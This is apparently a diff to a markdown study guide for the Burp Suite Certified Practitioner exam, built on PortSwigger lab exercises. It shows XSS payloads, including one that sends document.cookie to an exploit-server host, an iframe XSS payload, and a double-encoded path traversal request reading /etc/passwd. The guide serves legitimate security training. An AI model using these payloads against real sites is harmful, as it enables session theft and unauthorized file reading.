@@ -82,6 +82,8 @@ The acronym BSCP has nice simular ring to it, same as OSCP  :)
 
 [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
 
+### DOM XSS Exploitation with web messages  
+
 >Identify web messages on target that is using **postmessage()** with **DOM Invader**.  
 
 ![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  
@@ -179,7 +181,7 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 <iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
 ```  
 
-### Cookie Stealers (Reflected XSS)  
+### Reflected XSS (Cookie Stealers)  
 
 >In the Search function on webapp a Reflected XSS is identified, then deliver exploit link to victim with cookie stealing payload in hosted **iframe** on exploit server.  
 
@@ -1276,6 +1278,10 @@ Referrer-Policy: unsafe-url
 ## File Path Traversal
 
 >The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.
+
+```bash
+../../../../../../../../../../
+```
 
 ```html
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
